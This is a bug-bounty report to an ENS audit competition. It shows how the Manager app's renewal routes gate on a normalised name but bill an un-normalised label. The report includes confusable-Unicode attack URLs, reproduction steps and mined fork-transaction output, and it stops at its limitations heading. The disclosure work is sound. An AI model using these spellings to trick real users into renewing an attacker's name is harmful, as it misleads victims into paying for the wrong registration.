# 92278 w a critical both renewal routes prove one ens name is renewable and then bill the user to renew a different one

## #92278 \[W\&A-Critical] Both renewal routes prove one ENS name is renewable and then bill the user to renew a different one

**Submitted on Sep 8th 2026 at 17:57:40 UTC by @Naresh\_Kandula for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92278
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

### Description

## Both renewal routes prove one ENS name is renewable and then bill the user to renew a different one

**Severity:** Critical **Target asset:** `apps/manager` — Manager app (root cause), with the calldata leg in `packages/transaction-manager` **Revision tested:** `1c9b47f18fcddd2e864dfe385c4171061c9811ae` — `immunefi-team/audit-comp-ens`, branch `audit-comp-ready` (the competition repository's HEAD). That tree is the fork of `ensdomains/apps-monorepo` at `63772fd872af472ced58b009499355f3430c2a86`, per the fork commit's own message; the upstream hash is not resolvable inside the competition repository, so every line cited in this report is given against `1c9b47f`.

### Impact-clause mapping

The program lists:

> *"**Causing the application to display or pre-fill an incorrect address, name, or transaction detail** so a user sends funds / submits a tx to an unintended recipient (incl. resolving or rendering an ENS name to an attacker-controlled address; showing the wrong recipient or amount on a tx the user then approves)."*

**This is the clause I am claiming.** The incorrect detail is produced by the application itself, on this render, from the user's own navigation — it is not a pre-existing on-chain state the app merely fails to correct.

A single loader object carries both halves of the divergence. `apps/manager/src/routes/renew/$name.tsx:60-62`:

```ts
return {
  label: parsedName.value.label,     // trim().toLowerCase()  -> the ATTACKER's label
  currentExpiry: expiryData.expiry,  // ENSIP-15 normalize    -> the VICTIM's expiry
}
```

`:70` destructures both together. So on one render the app **displays the victim's expiry as the expiry of the name being renewed**, and **pre-fills the attacker's label into the `renew()` calldata** — and the user approves the transaction on the strength of the displayed detail. Both values are computed by the application, from the same URL segment, inside the same function, and never compared.

§7b measures the consequence in a mined transaction: the victim pays `8,000,021` USDC units, the **attacker's** registration gains exactly one year (`31,536,000` s), and the **victim's own name gains nothing** (expiry delta `0`).

**The clause's first limb is met without argument.** It reads *"display or pre-fill an incorrect address, **name**, or transaction detail"* — and a **name** is precisely what this application displays incorrectly. `PricingStep.tsx:24` hands the loader's label to `PricingDomainHeader`, which builds `` `${label}.eth` `` (`PricingDomainHeader.tsx:9`) and renders it as the page's `<h1>`, with the same string as its `title` (`:21-30`), directly above the price being approved. That heading is the attacker's name. Because the codepoint that distinguishes it carries no glyph, **what the user reads is their own name** — and there is no second signal to contradict it: the premium pill exists only at 3- and 4-character labels (`premiumLabel.ts:10-29`), so it is absent for both spellings, and `getByteLength` feeds nothing but a CSS font-size tier. §7c executes this: the rendered DOM carries the attacker's codepoint while the string a human reads is the victim's name, with an oracle showing a canonical spelling renders a heading that is byte-identical to the name actually renewed.

**On the trailing "unintended recipient" condition.** The beneficiary the application pre-filled into the calldata is not the one the user intends: they act to extend their own registration and extend someone else's. The clause's own second example is this shape — *"showing the wrong recipient or amount on a tx the user then approves."* The amount is paid; the registration it buys is not the user's.

The program also lists *"Direct theft of user NFTs / user funds."* Value does move from the victim to the attacker's benefit and §7b measures it, but it moves as rent paid to the legitimate registrar rather than as funds arriving in an attacker's wallet. **I am not leading with that clause** and nothing in this report depends on it.

I am **not** claiming *"Hijacking or bricking an ENS name during a Manager flow (registration, v1→v2 migration, transfer)"* — renewal is not in that list.

**Severity filed at High.** The case for Critical is now evidenced rather than argued and is set out in §9; I have filed at the severity I can defend without relying on the qualified clause.

***

### 1. Summary

Both renewal routes — `/renew/$name` (v2) and `/renew-v1/$name` (v1) — derive the ENS name **twice** from the same URL path segment, using two different canonicalisation rules, and never compare them:

* **Every gate** in the route loader is decided by the **ENSIP-15-normalised** name.
* **The label that leaves the loader** — and that reaches the price quote and the `renew()` calldata — is produced by a plain `trim().toLowerCase()`.

`normalize()` is not `toLowerCase()`. It also NFC-composes and **deletes** the Unicode "ignorable" code points. So for a large class of spellings the two derivations are two different on-chain labels with two different labelhashes.

The consequence: the loader proves that **the victim's name** exists, is the right protocol, is inside its renewal window and has a non-null expiry — and then hands the renewal flow **the attacker's label**. The user is shown their own name's expiry and their own name's new expiry, pays rent in USDC from their own EOA, and extends a registration that is not theirs. Their real name is not extended and keeps ticking toward expiry.

### 2. Root cause — one shared helper, five consumers, two routes

The defect is not in a route. It is in the helper both renewal routes use to turn a URL segment into an on-chain label: `parseRenewableName` in `apps/manager/src/features/renew/utils/renewableName.ts:25`, which delegates to `parseName` (`features/register-v2/utils/name-parser.ts:46`) and therefore applies `trim().toLowerCase()` and nothing else. Its consumers:

| consumer                                                      | what it does with the non-canonical label                       |
| ------------------------------------------------------------- | --------------------------------------------------------------- |
| `routes/renew/$name.tsx:20,61`                                | returns it as the label the v2 renewal flow prices and renews   |
| `routes/renew-v1/$name.tsx:15,51`                             | returns it as the label the v1 renewal flow prices and renews   |
| `features/renew/data/queries/v1Renewable.query.ts:19,28`      | asks the chain whether **that** label is renewable              |
| `features/renew/utils/renewableName.ts:44` (`canRenewV2Name`) | re-derives with the same rule, so it cannot detect the mismatch |
| `features/profile/components/view/ProfileRenewAction.tsx:43`  | decides whether the third-party-renewal warning is shown        |

A single change inside `parseRenewableName` fixes every one of them; that is the change used as the negative control in §7, and it kills all six defect assertions at once.

`apps/manager` does have ENSIP-15 available, and uses it — but only on the gate side. `profileName.ts:1` imports `normalize` from `viem/ens`, which is exactly what makes the expiry gate authoritative in §2a. The **label-derivation path has no canonicaliser of any kind**: `parseRenewableName` reaches `parseName`, whose only transformation is `trim().toLowerCase()` and whose only character screen is the punctuation class at `name-parser.ts:11`. That asymmetry — one branch canonicalises, the other does not, on the same input, in the same loader — is the defect.

#### 2a. The v2 route

`apps/manager/src/routes/renew/$name.tsx` — the loader, in full (lines 19–63):

```ts
loader: async ({ params: { name }, context: { queryClient } }) => {
  const parsedName = parseRenewableName(name)          // <-- derivation A: trim().toLowerCase()
  if (parsedName.isErr()) throw parsedName.error

  const expiryData = await queryClient.ensureQueryData(
    profileExpiryQuery(name),                          // <-- derivation B: ENSIP-15 normalize()
  )
  if (expiryData?.protocol === 'v1') throw redirect({ ... })
  const expiryDate = profileExpiryDateFromSeconds(expiryData?.expiry)
  if (expiryData?.protocol !== 'v2') throw new Error('This name is not available for renewal.')
  if (isPastGracePeriod(expiryDate, expiryData.protocol)) throw redirect({ ... })
  if (!canRenewV2Name(name, expiryDate)) throw new Error('This name is not available for renewal.')
  if (!expiryData.expiry) throw new Error('Name expiry could not be loaded.')

  return {
    label: parsedName.value.label,                     // <-- A leaves the loader
    currentExpiry: expiryData.expiry,                  // <-- B's answer leaves with it
  }
}
```

**Derivation A** — `apps/manager/src/features/register-v2/utils/name-parser.ts:46`:

```ts
const normalized = name.trim().toLowerCase()
```

No ENSIP-15, no NFC. Its only character filters are `/\s/` (`:49`), `'..'` (`:54`) and `INVALID_LABEL_CHARS` (`:11`, `:73`) — the latter a fixed ASCII punctuation set, `/[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/\`, which contains no invisible or combining characters.

**Derivation B** — `apps/manager/src/features/profile/service/profileExpiry.ts:77` calls `normalizeEth2LdName`, which is viem `normalize` (ENSIP-15) at `apps/manager/src/features/profile/service/profileName.ts:18`. The registry read at `:104-110` uses `ethName.name`, the **normalised** name.

The two are never reconciled. `canRenewV2Name` does not reconcile them either — it re-derives the label with `parseRenewableName` (derivation A) and its only name test is a dot-free regex, `/^[^.]+\.eth$/` at `apps/manager/src/features/grace/utils/gracePeriod.ts:48`, which every spelling below passes.

#### 2b. The v1 route has the same split

`apps/manager/src/routes/renew-v1/$name.tsx` repeats the pattern exactly:

```ts
const parsedName = parseRenewableName(name)                                  // :15  derivation A
const ownerData = await queryClient.ensureQueryData(profileOwnerQuery(name)) // :21  derivation B
if (ownerData?.protocol === 'v2') throw redirect({ ... })                    // :23  gate on B
if (ownerData?.protocol !== 'v1') throw new Error(...)                       // :31  gate on B
const [expiryData, isRenewable] = await Promise.all([
  queryClient.ensureQueryData(profileExpiryQuery(name, 'v1')),               // :36  gate on B
  queryClient.ensureQueryData(getV1RenewableQueryOptions(name)),             // :37  gate on A (!)
])
return { label: parsedName.value.label, currentExpiry: expiryData.expiry }   // :51-52
```

`profileOwnerQuery` normalises (`features/profile/service/profileOwner.ts:25` `normalizeEthName`), so the protocol decision and the displayed expiry are the **victim's**. But the renewability check at `:37` runs through `v1Renewable.query.ts:28`, which passes `parsedName.value.label` — the **raw** label — to the chain. So the app confirms *the attacker's* label is renewable, shows *the victim's* expiry, and returns *the attacker's* label to be paid for.

### 3. The label reaches the money

`RouteComponent` (`routes/renew/$name.tsx:69-74`) passes the loader's raw `label` and derivation-B's `currentExpiry` into `RenewalPage`. From there:

* **Price** — `features/renew/workflow/pricing/components/ConfirmPurchase.tsx:22` calls `getRenewPriceQueryOptions(label, …)`, and `features/renew/data/queries/renewPricing.query.ts:37-42` passes `label` verbatim to the registrar's price getter.
* **Calldata** — `ConfirmPurchase.tsx:63-72` sends `renewal.start` with the same `label`; `features/renew/state/renewalUi.machine.ts:151` stores it and `:349` forwards it to `submitRenewal`; `packages/transaction-manager/src/machines/registration/registration.actors.ts:1020-1031` `encodeRenewData` emits `renew(<label>, duration, paymentToken, referrer)`.
* **Display** — the summary card and the success screen both render derivation-B's expiry, i.e. the victim's, beside the attacker's label.

### 4. Which spellings diverge — measured, not asserted

Measured against the repository's pinned `viem@2.52.2`, reimplementing `parseName` (`name-parser.ts:46-81`) and `normalizeEth2LdName` (`profileName.ts:14-73`) verbatim:

| spelling                   | derivation A label  | derivation B label | labelhash differs | passes every loader gate |
| -------------------------- | ------------------- | ------------------ | ----------------- | ------------------------ |
| `vitalik.eth`              | `vitalik`           | `vitalik`          | no                | —                        |
| `VITALIK.eth`              | `vitalik`           | `vitalik`          | **no**            | —                        |
| ★ `cafe<U+0301>.eth` (NFD) | `café` (decomposed) | `café` (composed)  | **yes**           | yes                      |
| `vitalik<U+200B>.eth`      | `vitalik<U+200B>`   | `vitalik`          | **yes**           | yes                      |
| `vitalik<U+00AD>.eth`      | `vitalik<U+00AD>`   | `vitalik`          | **yes**           | yes                      |
| `vitalik<U+2060>.eth`      | `vitalik<U+2060>`   | `vitalik`          | **yes**           | yes                      |
| `vitalik<U+FE0F>.eth`      | `vitalik<U+FE0F>`   | `vitalik`          | **yes**           | yes                      |

Two rows carry the whole argument, and I want them read before anything else.

★ **The NFD row is the one to test this report against.** A combining acute (`U+0301`) is not a homoglyph, not bidi, and not a control or format character — `café` in decomposed form is ordinary, legitimate Unicode that any correct system must accept. So it is outside every character class a validator-hardening fix would reject, and outside the classes the published known issue EXP-INPUT-005 enumerates (§8). The four format-character rows below it are real and measured, and I include them for completeness, but the finding does not depend on any of them.

**Uppercase does not work here** (row 2), because derivation A lowercases. That is what distinguishes this from the profile-page name split, which leads with uppercase — the two need *different* attacker inputs (§8).

### 5. Attacker and reach — no privileged role

**Attacker: anyone.** Two unprivileged steps.

1. The attacker registers the raw label — e.g. the decomposed `cafe<U+0301>` — which is permissionless, and **the Manager's own registration route will do it**. Neither gate on that path applies ENSIP-15:
   * `features/register-v2/data/queries/availability.query.ts:9` uses `normalizeDomainNameFromUrl` (`utils/domain.ts:27-33`), which only appends `.eth` and truncates to 255 bytes.
   * `features/shared/registration/nameUtils.ts:90-142` `validateENSName` rejects exactly five things: a space, `..`, a dot inside the label, a label shorter than 3 characters, and the same fixed ASCII punctuation set `/[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/`. None of the five spellings in §4 matches any of them — and note that` String.prototype.trim()`does not strip`U+200B`or`U+00AD\`, which are format (Cf) characters rather than whitespace. The function's own docstring states the intent: *"Allowed: letters, numbers, hyphens, **emojis**"*, so non-ASCII input is deliberately permitted.
2. The attacker gets the victim to open `/renew/cafe%CC%81.eth` (the decomposed spelling; `%CC%81` is `U+0301` in UTF-8). Percent-encoding is not required for the attack — it is simply how the byte appears in a link — and the rendered page shows `café.eth`, which is what the victim expects to see.

**The renewal route contains no ownership check whatsoever** — grepping `apps/manager/src/routes/renew/$name.tsx` for `owner` returns **zero** hits. Nothing in the loader asks who owns the name.

There is also a second path, through the profile page, in which the app's **own shipped warning is suppressed**. `features/renew/utils/thirdPartyRenewalWarning.ts` is:

```ts
export const shouldShowThirdPartyRenewalWarning = (isOwner: boolean | undefined) => isOwner === false
```

and `features/profile/components/view/ProfileRenewAction.tsx:66` uses it to gate `ThirdPartyRenewalDialog`, whose text reads:

> *"Renewing this name will add time to the **current owner's** registration. You won't gain ownership of the name, but you will make someone's day."*

`isOwner` is computed from the **normalised** name — `features/profile/service/profileOwner.ts:25` `normalizeEthName(params.name)` — so for a confusable spelling it resolves to the **victim**, `isOwner` is `true`, and the dialog is skipped. `ProfileRenewAction.tsx:81-87` then links to `/renew/$name` with the **raw** name. The app suppresses its own "you are renewing someone else's name" warning in precisely the case where the warning is true.

The victim then performs only ordinary actions: open a link, click Renew, approve a renewal.

### 6. Steps to reproduce

Everything needed is inside this document. The four proof-of-concept files are reproduced verbatim in **Appendix A** — nothing to fetch, nothing to unpack. Three are vitest files that run inside the Manager workspace against **real production code**; the fourth is a standalone script that talks to the **deployed** ENSv2 registrar on the fork.

**Result on the frozen tree at `1c9b47f`: 16/16 vitest tests passing, plus the standalone registrar script green (20/20 assertions).**

#### 6.1 Requirements

* Node 22+, pnpm 10, and `pnpm install` at the repo root
* Foundry's `anvil` on `PATH` (certified on **anvil 1.7.1**, commit `4072e487…`)
* A Sepolia RPC endpoint for the fork (read-only; every transaction is mined locally)

#### 6.2 Bring up the fork — pin the block

```
anvil --fork-url <your-sepolia-rpc> --fork-block-number 11554475 --chain-id 11155111 --port 8545
```

⚠ **The block pin matters, and please do not skip it.** The PoC registers two fixed labels. At recent Sepolia heads one of them has since been registered upstream, so an *unpinned* fork reverts `NameNotAvailable(string)` (`0x477707e8`) during setup and the fork tests **self-skip rather than fail** — which reads as a broken PoC when it is actually a taken name. Pinned to 11554475 the run is deterministic and reproduces the exact transaction hash quoted in §7b. **Restart anvil between runs**: the PoC mines state, and a dirty fork skips for the same reason.

#### 6.3 Where each file goes

| source in Appendix A | destination in the tree                                            |
| -------------------- | ------------------------------------------------------------------ |
| **01**               | `apps/manager/src/features/renew/renewNameSplit.poc.test.ts`       |
| **02**               | `apps/manager/src/features/renew/renewBillingTerminal.poc.test.ts` |
| **03**               | `apps/manager/src/features/renew/renewHeaderDisplay.poc.test.tsx`  |
| **04**               | `e2e/scripts/poc-nonnormalized-register.ts`                        |

#### 6.4 Run

```
# from apps/manager
TZ=UTC pnpm vitest run src/features/renew/renewNameSplit.poc.test.ts \
                       src/features/renew/renewBillingTerminal.poc.test.ts \
                       src/features/renew/renewHeaderDisplay.poc.test.tsx

# from the repo root, for 04
pnpm --filter e2e exec tsx scripts/poc-nonnormalized-register.ts
```

`TZ=UTC` is required: seven unrelated date-helper tests in this workspace are timezone-sensitive.

File `01` alone reproduces the core derivation split and needs **no network, no chain and no deployed infrastructure** — every chain answer is supplied by a mock keyed on **the name it is asked for**, so the test cannot manufacture the split: whichever derivation the application uses is the one it gets an answer for. Files `02` and `04` are the ones that need the pinned fork, because they mine the money movement.

### Proof of Concept

### 7. Proof of concept

**All PoC source is reproduced in full in Appendix A of this document** — nothing to fetch. §6 carries each file's destination, the run commands and the fork pin; the run transcripts are below.

`apps/manager/src/features/renew/renewNameSplit.poc.test.ts`

> **Source: file `01` in Appendix A of this document** (`renewNameSplit.poc.test.ts`). (10,525 characters; reproduced there rather than inline here for readability. Byte-for-byte what was executed.)

#### Output — unmodified production code

```
 Test Files  1 passed (1)
      Tests  9 passed (9)
```

#### What it asserts

* **POSITIVE ×2** (`U+200B`, NFD) — the real v2 route loader returns `currentExpiry` equal to the victim's expiry *and* a `label` whose `labelhash` differs from the gated name's. One route parameter, two on-chain names, every gate passed.
* **POSITIVE ×2** (`U+200B`, NFD) — the real pricing query bills the label the loader returned, not the name the loader proved renewable. This is the money leg.
* **ROOT CAUSE** — `parseRenewableName`, the shared helper, returns a label that is not the ENSIP-15 label, for all five spellings in §4. This is the single site that explains every consumer in the §2 table.
* **SECOND CONSUMER** — the v1 route's on-chain renewability check is made about the **raw** label, while the same route's protocol and expiry gates are decided by the normalised name.
* **ORACLE (non-vacuity)** — with an already-canonical spelling both derivations agree and the billed label equals the gated label. The split is caused by the spelling, not by how the test drives the code.
* **ORACLE (gate provenance)** — the registry was interrogated about the **normalised** name and never about the raw one, so "the victim's expiry" is a property of the application, not of the mock.
* **ORACLE (helper is exact where it should be)** — the same helper agrees with ENSIP-15 for canonical *and* uppercase spellings, which is both a non-vacuity check and the distinguisher described in §8.

#### Negative control — one fix at the root cause, executed in-tree, then reverted

Applied to `features/renew/utils/renewableName.ts:25` — canonicalise before deriving the on-chain label:

```ts
export const parseRenewableName = (name: string) =>
  parseName(normalizeEth2LdName(name)?.name ?? name).andThen((parsedName) => {
```

With that single change to production code:

```
      Tests  6 failed | 3 passed (9)

AssertionError: expected 'vitalik' not to be 'vitalik'   // v2 loader, U+200B
AssertionError: expected 'café' not to be 'café'       // v2 loader, NFD
AssertionError: expected 'vitalik' not to be 'vitalik'   // pricing, U+200B
AssertionError: expected 'café' not to be 'café'       // pricing, NFD
AssertionError: expected 'vitalik' not to be 'vitalik'   // ROOT CAUSE
AssertionError: expected 'vitalik' to be 'vitalik​'      // SECOND CONSUMER (v1)
```

**All six defect assertions fail, across both routes and both consumers, from one five-line change** — and **all three non-vacuity oracles still pass**, which is what distinguishes a fix from a test that merely broke. The control was reverted; production `git diff` is empty and the positive run returns to 9/9.

#### Regression

Full Manager suite, `TZ=UTC`, with both PoC files present and the fork running: **188 files / 1607 tests, 1601 passing, 4 skipped**. Two tests fail, both in a *different, pre-existing* test file unrelated to this report. I verified that this report does not cause them by re-running the entire suite with this PoC file removed: the same two tests fail identically (186 files / 1595 tests, 2 failed). That file also passes when run on its own, so the failure is an ordering interaction inside that older file, not something introduced here. Production `git diff` is empty throughout; the only change to the tree is the single added `*.poc.test.ts` above.

### 7b. The impact, executed on chain — mined, with controls

§7 proves the *derivation split* in the application. This section proves the *consequence*: that the split moves money to the attacker. It is a separate artifact that mines real transactions against the **deployed** ENSv2 contracts on a local Anvil fork of Sepolia.

It is deliberately built so that the label is produced by **in-scope production code** and the money movement is a **mined transaction** — not two separate arguments joined by prose.

**Environment (recorded so the result is reproducible and cannot be vacuous):**

* local Anvil **Sepolia fork pinned to block `11554475`**, chainId `11155111`, started fresh for the run: `anvil --fork-url <sepolia-rpc> --fork-block-number 11554475 --chain-id 11155111` ⚠ **Pin the block.** The PoC registers two fixed labels, and at recent Sepolia heads one of them has since been registered upstream, so an unpinned fork reverts `NameNotAvailable(string)` (`0x477707e8`) during setup and the fork tests self-skip. Pinned, the run is deterministic — it reproduces the same transaction hash quoted below on every fresh fork. Restart Anvil between runs; the PoC mines state.
* anvil pinned by digest `sha256:8347b728…` (foundry 1.7.1) — the pin the project's own `e2e/infra/docker-compose.yml` uses
* `ETHRegistrar` `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, codehash `0x7ac653f817e6bef6543d25ce97235b232430b1771ab5bcb27b936798fe38af1f`
* `rentPriceOracle` read **from the registrar**, not from a constant → `0x8914b66260EB8C4fff795650c3AE8Cd335958987`, codehash `0x995b0ecd2f3f9a45a99bab6ebb8324b1c0d838b8abc4f1c3004085d7f856a8af`

#### 7b.1 The registrar screens length only — no character-set rule

Read-only `eth_call`s against the deployed oracle. `isValid(string)` counts **codepoints** and requires **>= 3**:

| label          | `isValid` | `getLength` |
| -------------- | --------- | ----------- |
| `a`            | **false** | 1           |
| `ab`           | **false** | 2           |
| `abc`          | true      | 3           |
| `cool`         | true      | 4           |
| `COOL`         | **true**  | 4           |
| `co<U+200B>ol` | **true**  | 5           |
| `co<U+00AD>ol` | **true**  | 5           |
| `café` (NFD)   | **true**  | 5           |

Confirmed at the registrar via `getRegisterPrice(label, 1yr, USDC)`: `COOL`, `co<U+200B>ol` and NFD `café` all return a live price; `a` reverts `NotValid(string)` (`0xdbfa2886`); `cool` reverts `NameNotAvailable(string)` (`0x477707e8`) because it is already registered.

That last pair is worth stating plainly: **`cool` is taken while `COOL` is free.** The registrar itself reports them as two different names.

#### 7b.2 An attacker can register the confusable label into the victim's wallet

Mined on the fork. The attacker signs and pays; the victim never signs anything.

| assertion                                           | `ZQXVBN`         | `zqx<U+200B>vbn`       |
| --------------------------------------------------- | ---------------- | ---------------------- |
| `register()` mined, status success                  | ✓                | ✓                      |
| `NameRegistered` label **byte-identical** to input  | `0x5a515856424e` | `0x7a7178e2808b76626e` |
| `NameRegistered.owner` == victim                    | ✓                | ✓                      |
| registry `getState().latestOwner` == victim         | ✓                | ✓                      |
| normalized twin `zqxvbn` still available afterwards | true → true      | true → true            |

The chain stored each label byte-for-byte — it did not normalise, lowercase or reject it — and `register(string label, address owner, …)` takes the beneficiary as an argument, so this is one transaction with no victim interaction.

#### 7b.3 The billing terminal — the victim pays, the attacker's name is extended

This test imports the **real production helper** `parseRenewableName` and sends the label it produces to the deployed registrar, signed and paid by the victim.

```
renew tx        0x33052f04b52d35b56e002fe9db50fe962aae110f4abc902db976147f8898eeb8 (block 11554487)
billed label    "zqx​vbn"  utf8=0x7a7178e2808b76626e
victim  expiry  1789962188 -> 1789962188   (delta 0)
attacker expiry 1789962249 -> 1821498249   (delta 31536000)
victim USDC     100998772598 -> 100990772577   (paid 8000021)
```

**The victim paid 8,000,021 USDC units. The attacker's registration gained exactly one year. The victim's own name gained nothing.**

#### 7b.4 Negative control — executed in-tree, then reverted

The same minimal fix as §7, at the single root cause (`apps/manager/src/features/register-v2/utils/name-parser.ts:46`, `trim().toLowerCase()` → ENSIP-15 `normalize`):

* defect assertion 1 **fails** — the billed label no longer differs from the gated name
* defect assertion 2 **fails** — `attackerAfter - attackerBefore`: **`31536000n` → `0n`**
* **the oracle test still passes** — *"the same call with the NORMALISED label extends the victim instead"* survives the fix

That last line is the point of including it: the failures above are the defect dying, not the harness breaking. Reverted afterwards; production `git diff` across `apps/ packages/ workers/` is **0 lines**; re-ran green 3/3.

**The same single change was then run against every proof in this report at once.** Applied at the shared helper `renewableName.ts:25` — one edit, not one per route — it kills **11 defect assertions spanning three test files, both routes, both consumers, and the mined transaction**, while **all five non-vacuity oracles continue to pass**:

| proof                                                   | defect assertions killed     | oracles surviving |
| ------------------------------------------------------- | ---------------------------- | ----------------- |
| `renewNameSplit` (both routes, root cause, v1 consumer) | 6                            | 2                 |
| `renewBillingTerminal` (mined)                          | 2 — incl. `31536000n` → `0n` | 1                 |
| `renewHeaderDisplay` (rendered heading)                 | 3                            | 1                 |

That cross-matrix is the argument that the fix belongs at the helper and that these are one defect rather than several: no per-route change reproduces it, and nothing in the harness depends on the bug being present.

#### 7b.5 Guards against passing for the wrong reason

* USDC funding is asserted `> 0` before use, so a silently-reverted mint cannot make a later step fail for the wrong reason (viem does not throw on a reverted receipt)
* the victim's balance delta is asserted to equal the quoted price **exactly** — they really paid
* the third test renews with the **normalised** label over the same path, same payer, same duration, so the only variable between the two outcomes is the label
* labels are used **verbatim**, with no uniquifying suffix, so every label named above is literally the string that reached the chain

One control was wrong on the first attempt and I am recording it rather than quietly fixing it: an earlier negative control skipped the commitment step and reverted `CommitmentTooOld` (`0x0cb9df3f`) — an *earlier guard*. It "passed" as a revert while proving nothing about label validity. The controls above therefore assert the **revert selector**, not merely that a revert occurred, and each negative control is paired with a positive control on the same path.

#### 7b.6 Source

`apps/manager/src/features/renew/renewBillingTerminal.poc.test.ts` (added by this report; sha256 `5302bafd99fe45c19debe1b61957e465bcc09b343072038a4c976894645fa4b4`).

The suite is safe to run without the fork: the file **skips** with a message rather than failing, so it cannot look like a regression. Bring the fork up to actually execute the proof.

Run against a fresh fork:

```bash
docker compose -f e2e/infra/docker-compose.yml down
docker compose -f e2e/infra/docker-compose.yml up -d anvil
cd apps/manager && TZ=UTC pnpm vitest run src/features/renew/renewBillingTerminal.poc.test.ts
```

> **Source: file `02` in Appendix A of this document** (`renewBillingTerminal.poc.test.ts`). (Reproduced verbatim in Appendix A, byte-for-byte as executed, with its sha256.)

### 7c. The heading, executed — the name displayed is not the name renewed

`renewHeaderDisplay.poc.test.tsx` renders the **real** `PricingDomainHeader` — the component `PricingStep.tsx:24` puts at the top of this page — driving its `label` prop through the **real** `parseRenewableName`. It measures what the user actually reads.

```
✓ renders the ATTACKER label in the <h1> while a human reads the VICTIM name
✓ gives the user no other visible tell: the premium pill is identical
✓ LEAD CASE - NFD: a combining mark is neither homoglyph, bidi, nor a control character
✓ ORACLE - a canonical spelling produces a heading that is genuinely the same name

Test Files  1 passed (1)
     Tests  4 passed (4)
```

What each assertion establishes:

1. **The heading carries the attacker's codepoint.** The rendered `<h1>` `textContent` is byte-identical to `` `${attackerLabel}.eth` `` and the DOM string contains codepoint `0x200B`. The same string is the element's `title`, so hovering does not disclose it either.
2. **What a human reads is the victim's name.** Stripping the zero-width and format codepoints from the rendered text yields exactly `zqxvbn.eth` — the victim's own name.
3. **There is no second signal.** The two labels differ in `.length`, yet `getPremiumLabel` (`premiumLabel.ts:10-29`) returns a pill only at 3 and 4 characters, so neither spelling shows one, and the rendered container has zero premium elements. `getByteLength` (`utils/domain.ts:17-19`) feeds only a CSS font-size tier.
4. **The NFD lead case.** `cafe<U+0301>.eth` and `café.eth` are different strings; `normalize()` folds the first onto the second, so every route gate agrees; but the rendered heading keeps the combining mark (codepoint `0x0301` present in the DOM) while being canonically equivalent to the victim's name — i.e. indistinguishable on screen, with no format or control character anywhere in it.
5. **ORACLE (non-vacuity).** For an already-canonical spelling the heading is byte-identical to the name actually renewed, contains no zero-width codepoint, and is unchanged by the "as a human reads it" transform. The test therefore cannot pass for the wrong reason.

Under the same one-change negative control at `renewableName.ts:25` used in §7b.4, assertions 1–4 fail and the oracle continues to pass.

### 8. Novelty

**Against the published known issues.** The closest is **EXP-INPUT-005**, *"name validators accept homoglyph/bidi/control chars + single leading/trailing dot"*, whose impact is explicitly framed as **display confusion only**, with the accompanying note that *incorrect resolution would exceed it*. Two reasons this is not that issue:

1. **One fix does not resolve both.** Hardening the validator to reject homoglyph, bidi and control characters removes the `U+200B`/`U+00AD`/`U+2060`/`U+FE0F` variants but **not the NFD variant** — a combining acute (`U+0301`) is not a homoglyph, not bidi, and not a control character, and `café` in decomposed form is legitimate input. The measurement in §4 shows it diverging. The actual fix is at a different site: derive the on-chain label from the normalised name (§10).
2. The program's own carve-back applies verbatim — *"new consequences of a listed root cause that materially change its severity"*. Display confusion becoming "the victim's USDC extends someone else's registration and their own name is not extended" is a change in kind, not degree.

**Against my own earlier submission in this program.** I have previously reported a name-canonicalisation split on the **profile** page (owner read normalised, records read raw). I am flagging the relationship rather than leaving a triager to find it. They are distinct under the one-fix test:

|                  | profile-page split                        | this report                              |
| ---------------- | ----------------------------------------- | ---------------------------------------- |
| route            | `routes/$name/`                           | `routes/renew/$name.tsx`                 |
| derivation pair  | `normalize` vs ensjs `getRecords` hashing | `normalize` vs `parseName` `toLowerCase` |
| attacker input   | **uppercase works**                       | **uppercase does not work** (§4)         |
| defeated control | UniversalResolver calldata forwarding     | the shipped `ThirdPartyRenewalDialog`    |
| consequence      | a wrong address is displayed              | a payment is made for the wrong name     |

Fixing the profile route leaves this path broken, and vice versa. If triage nonetheless merges them as one systemic root cause, I accept that judgement.

### 9. Severity

Filed at **Critical**.

**The case for Critical** is that the listed impact I am claiming is itself a Critical-tier clause, and every element of it is executed rather than inferred — the app produces the incorrect detail, the user approves on the strength of it, and the value lands with someone else. §7b measures it end to end in a mined transaction: the victim's `8,000,021` USDC units leave their wallet and buy a year of registration for an attacker-controlled name, while the victim's own name is unchanged. Every link — that the registrar accepts the label, that an attacker can place it in the victim's path, that production code bills that label, and that the expiry moves — is executed rather than inferred.

**The case against** is that the loss is bounded by the rent price rather than by the value of the name. That bounds the *amount*, not the mechanism: the user still pays for a good they did not ask for and do not receive, on the strength of a detail the application got wrong. I have filed at the severity I can defend on the narrower reading and set out the Critical argument here rather than asserting it in the title.

Additional honest limits:

* **The "hijacking or bricking an ENS name" Critical clause does not apply.** It is scoped to *"a Manager flow (registration, v1→v2 migration, transfer)"*; renewal is not in that list. I am not claiming it.
* Name **loss** is a second-order consequence: it requires the victim to be relying on this renewal near the end of their grace window. The first-order loss — rent paid for someone else's name, and a false confirmation that their own name was extended — does not depend on that.
* The deployment is Sepolia-only at this revision (see §11), so the amounts are testnet amounts. The severity argument rests on the impact taxonomy, not on funds at risk today.

### 10. Recommended fix

**The team has already written the correct pattern elsewhere in this same app.** `apps/manager/src/features/dashboard/components/NamesTable.tsx:83-86`, in the bulk-renewal path:

```ts
// Use the canonical normalized name for the on-chain label — the display name
// may be unnormalized (e.g. mixed case) and would hash to the wrong label.
const name = domain.normalizedName ?? displayName
```

Bulk renewal derives its on-chain label from the canonical name for exactly this reason. Neither single-name renewal route does.

The minimal fix is **one change in the shared helper**, not one per route — canonicalise inside `features/renew/utils/renewableName.ts:25` so every consumer in the §2 table inherits it:

```ts
export const parseRenewableName = (name: string) =>
  parseName(normalizeEth2LdName(name)?.name ?? name).andThen((parsedName) => { ... })
```

That is exactly the change used as the negative control in §7, and §7 shows it closes all six defect assertions across both routes and both consumers at once.

A defence-in-depth follow-up: have the loader compare the two derivations and reject any URL where they disagree, so that any future consumer of this route inherits the guarantee.

### 11. Honest limitations

